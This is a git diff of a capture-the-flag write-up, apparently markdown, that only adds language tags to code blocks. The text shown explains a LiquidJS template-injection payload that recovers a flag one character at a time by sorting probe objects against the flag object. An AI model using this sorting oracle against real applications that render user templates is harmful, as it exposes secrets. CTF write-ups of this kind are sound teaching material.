@@ -352,22 +352,22 @@ It has `name` properties whose values we control because they are taken from the
 > Note: To debug LiquidJS's behavior and craft the exploit template, I used https://liquidjs.com/playground.html
 
 To extract the flag, the idea is to first create a list which will be the charset. I have found no direct way to create a list with `liquidJS`, so we will use a string and split it:
-```
+```liquid
 {% assign chars = '0,1,2,3,4,5,6,7,8,9,_,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,}' | split: ',' %}
 ```
 
 We then make a "probe" object using the `group_by_exp` function to have a list which has each char as a name:
-```
+```liquid
 {% assign probes = chars | group_by_exp: 'char', "'' | append: char" %}
 ```
 
 Here, using `group_by_exp` instead of `group_by` will allow us to quickly test for the next char by adding the already known chars into the expression like so:
-```
+```liquid
 {% assign probes = chars | group_by_exp: 'char', "'plfanzen{' | append: char" %}
 ```
 
 Then, the next steps are simpler: we create a list that has both the probes and the flag object then sort that list. Finally, render each element's `items` field. `group_by_exp` populates `items` with the originals that produced each group's key, so for our single-char inputs each row prints the char we tested.
-```
+```liquid
 {% assign all = probes | push: flag %}
 {% assign sorted = all | sort_natural: 'name' %}
 {% for x in sorted %}|{{ x.items }}{% endfor %}|
